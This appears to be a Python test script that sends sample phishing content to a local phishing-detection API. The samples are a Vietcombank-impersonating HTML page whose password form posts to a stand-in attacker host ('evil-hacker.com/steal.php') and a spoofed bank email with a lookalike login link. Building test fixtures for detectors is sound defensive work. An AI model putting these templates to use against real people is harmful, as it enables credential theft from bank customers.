import requests
import json

# 1. Test HTML Phishing
print("--- TEST HTML PHISHING ---")
html_payload = {
    "html_content": '''
        <html>
        <head><title>Vietcombank - Security Check</title></head>
        <body>
            <!-- Brand impersonation -->
            <h2>Vietcombank Online Banking</h2>
            <p>Vui lòng đăng nhập để xác nhận tài khoản.</p>
            
            <!-- Suspicious Form: posts to external domain -->
            <form action="https://evil-hacker.com/steal.php" method="POST">
                <!-- Password field -->
                Mật khẩu: <input type="password" name="pwd">
                
                <!-- Hidden inputs often used in phishing kits -->
                <input type="hidden" name="token" value="abc">
                <input type="hidden" name="session" value="xyz">
                <input type="hidden" name="victim" value="123">
                
                <input type="submit" value="Xác nhận">
            </form>
            
            <!-- Cloaked content (hidden sensitive words) -->
            <div style="display:none">paypal login password free lucky</div>
        </body>
        </html>
    ''',
    "source_url": "https://random-site.xyz"
}

r1 = requests.post("http://127.0.0.1:8000/v1/check-html", json=html_payload)
print(json.dumps(r1.json(), indent=2, ensure_ascii=False))

# 2. Test Email Phishing
print("\n--- TEST EMAIL PHISHING ---")
email_payload = {
    "raw_email": """Delivered-To: victim@gmail.com
Received: from mail.evil-server.com (mail.evil-server.com. [192.168.1.100])
Authentication-Results: mx.google.com;
       spf=softfail (google.com: domain of admin@vietcombank-update.com does not designate 192.168.1.100 as permitted sender)
       dkim=fail
       dmarc=fail
From: "Vietcombank Security" <admin@vietcombank-update.com>
To: victim@gmail.com
Subject: TAI KHOAN CUA BAN DA BI KHOA!
Date: Wed, 6 May 2026 10:00:00 +0700

Kính gửi Quý khách,

Tài khoản của bạn vừa có giao dịch bất thường.
Vui lòng click vào link sau để đăng nhập và hủy giao dịch:
https://vietcombank.com.vn.login-secure.xyz/auth

Trân trọng.
"""
}

r2 = requests.post("http://127.0.0.1:8000/v1/check-email", json=email_payload)
print(json.dumps(r2.json(), indent=2, ensure_ascii=False))
